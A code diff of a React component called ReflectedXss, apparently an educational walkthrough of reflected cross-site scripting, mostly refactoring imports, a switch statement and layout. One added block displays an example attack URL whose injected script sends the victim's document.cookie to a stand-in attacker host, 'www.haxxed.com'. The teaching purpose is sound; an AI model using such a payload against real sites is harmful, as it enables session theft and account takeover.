@@ -8,22 +8,19 @@ import MessageBoxThree from './messageboxes/MessageBoxThree'; // Import more mes
 
 import messages from './messages'; // Assuming this is an array of messages
 import MessageBoxFour from './messageboxes/MessageBoxFour';
-import MessageBoxFive from './messageboxes/MessageBoxFive';
-import MessageBoxSix from './messageboxes/MessageBoxSix';
+import MessageBoxFive from './messageboxes/item5/MessageBoxFive';
+import MessageBoxSix from './messageboxes/item6/MessageBoxSix';
 import MessageBoxSeven from './messageboxes/MessageBoxSeven';
 import MessageBoxEight from './messageboxes/MessageBoxEight';
 import MessageBoxNine from './messageboxes/MessageBoxNine';
 import MessageBoxTen from './messageboxes/MessageBoxTen';
-
+// import { notificationMessage } from './notification'; // Import the notification message
 
 const ReflectedXss: React.FC = () => {
   const [currentIndex, setCurrentIndex] = useState(0);
 
   const handleNextButtonClick = () => {
-    setCurrentIndex((prevIndex) => {
-      const nextIndex = prevIndex + 1;
-      return nextIndex;
-    });
+    setCurrentIndex((prevIndex) => prevIndex + 1);
   };
 
   const handleListItemClick = (index: number) => {
@@ -34,34 +31,26 @@ const ReflectedXss: React.FC = () => {
 
   const renderMessageBox = () => {
     switch (currentIndex) {
-      // case 0:
-      //   return 
-      // case 1:
-      //   return 
-      // case 2:
-      //   return
-      //    <MessageBoxThree />;
       case 3:
-          return <MessageBoxFour />;
-        case 4:
-          return <MessageBoxFive />;
-        case 5:
-          return <MessageBoxSix />;
-        case 6:
-          return <MessageBoxSeven />;
-        case 7:
-          return <MessageBoxEight />;
-        case 8:
-          return <MessageBoxNine />;
-        case 9:
-          return <MessageBoxTen />;
-        case 10:
-            return <MessageBoxSeven />;
-          case 11:
-            return <MessageBoxEight />;
-          case 12:
-            return <MessageBoxNine />;
-     
+        return <MessageBoxFour />;
+      case 4:
+        return <MessageBoxFive />;
+      case 5:
+        return <MessageBoxSix />;
+      case 6:
+        return <MessageBoxSeven />;
+      case 7:
+        return <MessageBoxEight />;
+      case 8:
+        return <MessageBoxNine />;
+      case 9:
+        return <MessageBoxTen />;
+      case 10:
+        return <MessageBoxSeven />;
+      case 11:
+        return <MessageBoxEight />;
+      case 12:
+        return <MessageBoxNine />;
       default:
         return null;
     }
@@ -124,7 +113,14 @@ const ReflectedXss: React.FC = () => {
       </Grid>
 
       <Box sx={{ display: 'flex', justifyContent: 'center' }}>
-        <Box sx={{ display: 'flex', flexDirection: 'row', gap: 2 }}>
+        <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
+          {currentIndex === 5 && (
+            <Paper sx={{ p: 2, mb: 2, backgroundColor: 'blue',width: '40%'}}>
+              <Typography variant="body1" color="white">
+                www.welp.com?<br/>search=&lt;script&gt;window.location='www.haxxed.com?<br/>cookie='+document.cookie&lt;/script&gt;
+              </Typography>
+            </Paper>
+          )}
           {renderMessageBox()}
         </Box>
       </Box>
